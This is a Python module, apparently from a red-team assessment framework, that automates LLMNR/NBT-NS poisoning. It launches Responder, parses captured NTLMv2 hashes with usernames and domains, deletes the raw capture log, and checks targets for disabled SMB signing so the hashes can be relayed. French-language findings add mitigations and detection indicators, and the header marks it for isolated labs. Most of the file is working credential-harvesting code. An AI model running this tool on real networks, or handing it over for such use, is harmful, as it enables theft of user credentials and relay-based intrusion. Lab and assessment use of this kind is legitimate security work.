"""
Red Team - LLMNR/NBT-NS Poisoning
==================================
MITRE ATT&CK: T1557.001 - Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning

When a Windows machine cannot resolve a hostname via DNS, it falls back to
broadcasting a Link-Local Multicast Name Resolution (LLMNR) or NetBIOS
Name Service (NBT-NS) query on the local network. An attacker listening on
the same segment can respond to these queries and capture NTLMv2 hashes.

Attack flow:
    1. Listen for LLMNR/NBT-NS broadcast queries using Responder
    2. Respond to failed name resolution requests (posing as the target)
    3. Capture NTLMv2 challenge-response hashes from the victim
    4. Optionally crack hashes offline with Hashcat (mode 5600)

Also checks if SMB Signing is disabled - enabling NTLM Relay attacks
where captured hashes are relayed directly to another machine.

Detection indicators:
    - No native Windows Event ID - requires network-level detection
    - Wazuh Rule 17501: LLMNR/NBT-NS poisoning attempt
    - Monitor for unexpected LLMNR responses (UDP 5355)

⚠  FOR USE IN ISOLATED LAB ENVIRONMENTS ONLY.
"""

import subprocess
import threading
import time
import os
import re
from datetime import datetime

from utils.format_utils import print_info, print_warning, print_success, print_error

ATTACK_META = {
    "name":      "LLMNR/NBT-NS Poisoning",
    "phase":     "Credential Access",
    "mitre":     "T1557.001",
    "risk":      "Élevé",
    "event_ids": [],   # Pas d'Event ID Windows natif - détection réseau/Wazuh custom
    "tools":     ["Responder", "Inveigh"],
}

RESPONDER_LOG = "/tmp/responder_capture.log"
RESPONDER_DIR = "/usr/share/responder"


def run_attack(interface: str = "eth0", duration_s: int = 60,
               target: str = "domain.local", **kwargs) -> dict:
    """
    1. Launch Responder to poison LLMNR/NBT-NS queries
    2. Capture NTLMv2 hashes from victim machines
    3. Return findings + captured hashes
    """
    print_warning(f"[RED TEAM] LLMNR Poisoning - interface {interface} - durée {duration_s}s")

    findings = []
    captured_hashes = []

    # Check if LLMNR is actually enabled on the network first
    llmnr_enabled = _check_llmnr_active()
    if not llmnr_enabled:
        findings.append({
            "risk":        "Info",
            "title":       "LLMNR non détecté sur le réseau",
            "description": (
                "Aucun trafic LLMNR observé. "
                "Soit déjà désactivé via GPO, soit aucune résolution en échec pendant la fenêtre."
            ),
            "mitigation":  "Bonne pratique - confirmer la désactivation LLMNR via GPO.",
            "event_ids":   [],
        })

    # Launch Responder
    responder_running = _start_responder(interface, duration_s)

    if not responder_running:
        # Responder not available - document the vulnerability anyway
        findings.append({
            "risk":        "Élevé",
            "title":       "LLMNR/NBT-NS activé - vulnérable au poisoning",
            "description": (
                "LLMNR et NBT-NS sont activés par défaut sur Windows. "
                "Un attaquant sur le même segment réseau peut répondre aux requêtes "
                "de résolution de noms et capturer les hashes NTLMv2."
            ),
            "mitigation":  (
                "1. Désactiver LLMNR via GPO : "
                "Computer Configuration → Administrative Templates → Network → DNS Client "
                "→ Turn off multicast name resolution = Enabled.\n"
                "2. Désactiver NBT-NS : Propriétés TCP/IP avancées → WINS → Disable NetBIOS.\n"
                "3. Déployer un honeypot LLMNR pour détecter les tentatives."
            ),
            "event_ids": [],
        })
    else:
        # Parse Responder logs for captured hashes, then wipe the raw log:
        # it contains cleartext NTLMv2 hashes and the extracted data is
        # already preserved in captured_hashes / the report artifacts.
        captured_hashes = _parse_responder_logs()
        _cleanup_responder_log()
        if captured_hashes:
            findings.append({
                "risk":        "Critique",
                "title":       f"{len(captured_hashes)} hash(es) NTLMv2 capturé(s)",
                "description": (
                    f"Des hashes NTLMv2 ont été capturés via LLMNR poisoning. "
                    f"Comptes concernés : {', '.join(set(h['user'] for h in captured_hashes[:5]))}. "
                    f"Ces hashes peuvent être crackés hors-ligne (Hashcat mode 5600)."
                ),
                "mitigation":  (
                    "1. Désactiver LLMNR et NBT-NS immédiatement (GPO).\n"
                    "2. Réinitialiser les mots de passe des comptes capturés.\n"
                    "3. Implémenter SMB Signing pour bloquer les relay attacks."
                ),
                "event_ids": [],
            })
        else:
            findings.append({
                "risk":        "Moyen",
                "title":       "Responder actif - aucun hash capturé pendant la fenêtre",
                "description": (
                    "Responder a tourné mais aucune machine n'a émis de requête LLMNR "
                    "non résolue pendant la fenêtre de capture. "
                    "Dans un environnement réel, l'attente est plus longue."
                ),
                "mitigation":  "Désactiver LLMNR et NBT-NS via GPO.",
                "event_ids":   [],
            })

    # SMB Signing check (bonus - enables relay attacks if disabled)
    smb_unsigned = _check_smb_signing(target)
    if smb_unsigned:
        findings.append({
            "risk":        "Élevé",
            "title":       "SMB Signing désactivé - relay attack possible",
            "description": (
                "Sans SMB Signing, un attaquant peut relayer les hashes capturés "
                "via LLMNR poisoning directement vers d'autres machines (NTLM Relay). "
                "Cela permet d'obtenir un accès sans cracker le mot de passe."
            ),
            "mitigation":  (
                "Activer SMB Signing via GPO : "
                "Microsoft network server: Digitally sign communications (always) = Enabled."
            ),
            "event_ids": [],
        })

    return {
        "module":      "red_team.llmnr_poisoning",
        "status":      "success",
        "timestamp":   datetime.now().isoformat(),
        "attack_meta": ATTACK_META,
        "findings":    findings,
        "artifacts": {
            "captured_hashes": captured_hashes,
            "hash_type":       "NTLMv2 (Hashcat mode 5600)",
            "smb_unsigned":    smb_unsigned,
        },
        "iocs": [
            {
                "type":        "network",
                "value":       "LLMNR/UDP 5355, NBT-NS/UDP 137",
                "description": "Trafic multicast de résolution de noms - surveiller les réponses inattendues",
            },
        ],
        "summary": {
            "hashes_captured": len(captured_hashes),
            "llmnr_active":    llmnr_enabled,
            "smb_unsigned":    smb_unsigned,
        },
    }


# ── Private ───────────────────────────────────────────────────────────────────

def _check_llmnr_active() -> bool:
    """Check for LLMNR traffic via tshark (passive, brief window)."""
    try:
        result = subprocess.run(
            ["tshark", "-i", "any", "-a", "duration:5",
             "-Y", "llmnr", "-c", "1", "-q"],
            capture_output=True, text=True, timeout=10
        )
        return result.returncode == 0 and "1 packet" in result.stdout
    except Exception:
        return False  # Can't determine - assume potentially active


def _start_responder(interface: str, duration_s: int) -> bool:
    """Launch Responder in the background. Returns True if started."""
    if not os.path.exists(RESPONDER_DIR):
        print_warning("Responder introuvable - simulation documentaire uniquement.")
        return False

    try:
        cmd = [
            "python3", f"{RESPONDER_DIR}/Responder.py",
            "-I", interface,
            "-rdwv",
            "--lm",
        ]
        proc = subprocess.Popen(
            cmd, stdout=open(RESPONDER_LOG, "w"),
            stderr=subprocess.STDOUT
        )
        print_info(f"Responder actif (PID {proc.pid}) pendant {duration_s}s...")
        time.sleep(duration_s)
        proc.terminate()
        proc.wait(timeout=5)
        return True
    except Exception as e:
        print_error(f"Erreur démarrage Responder : {e}")
        return False


def _parse_responder_logs() -> list:
    """Extract captured NTLMv2 hashes from Responder log."""
    hashes = []
    if not os.path.exists(RESPONDER_LOG):
        return hashes
    try:
        with open(RESPONDER_LOG) as f:
            content = f.read()
        # NTLMv2: user::domain:challenge:hash1:hash2
        pattern = r"(\w+)::(\w+):([0-9a-fA-F]+):([0-9a-fA-F]+):([0-9a-fA-F]+)"
        for match in re.finditer(pattern, content):
            hashes.append({
                "user":   match.group(1),
                "domain": match.group(2),
                "hash":   "::".join(match.groups()),
            })
    except Exception:
        pass
    return hashes


def _cleanup_responder_log():
    """
    Remove the raw Responder capture file from disk.

    The file contains cleartext NTLMv2 hashes; the relevant data has
    already been extracted into `captured_hashes` / the report artifacts
    by _parse_responder_logs(), so it's safe to delete it here.
    """
    try:
        if os.path.exists(RESPONDER_LOG):
            os.remove(RESPONDER_LOG)
    except Exception:
        pass


def _check_smb_signing(target: str) -> bool:
    """Check if SMB signing is disabled on target."""
    try:
        result = subprocess.run(
            ["netexec", "smb", target],
            capture_output=True, text=True, timeout=10
        )
        return "signing:False" in result.stdout
    except Exception:
        pass
    try:
        result = subprocess.run(
            ["nmap", "-p", "445", "--script", "smb-security-mode", target],
            capture_output=True, text=True, timeout=20
        )
        return "message_signing: disabled" in result.stdout
    except Exception:
        return False
